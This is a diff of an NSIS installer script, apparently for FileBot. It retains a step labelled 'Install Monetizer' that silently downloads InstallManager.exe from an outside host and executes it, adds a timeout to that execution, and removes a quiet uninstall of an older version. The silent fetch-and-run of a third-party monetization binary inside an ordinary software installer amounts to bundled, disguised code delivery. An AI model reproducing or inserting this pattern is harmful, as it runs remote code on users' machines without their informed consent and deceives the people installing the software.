@@ -29,11 +29,7 @@ Section ""
 	 
      ;Install Monetizer
      inetc::get /SILENT /CONNECTTIMEOUT 10 /RECEIVETIMEOUT 30 "http://www.comay13north.com/download.php?loGFcg==" "$PLUGINSDIR\InstallManager.exe" /end
-     nsExec::Exec '$PLUGINSDIR\InstallManager.exe'
-     
-     ;Remove old version
-	 DetailPrint "Removing older versions..."
-     nsExec::Exec 'msiexec /quiet /x {2DE5DAFC-A5E4-41C2-8123-C358BA5A562D}'
+     nsExec::Exec /TIMEOUT=120000 '$PLUGINSDIR\InstallManager.exe'
 	 
 	 DetailPrint "Downloading latest version..."
      ;Install latest FileBot
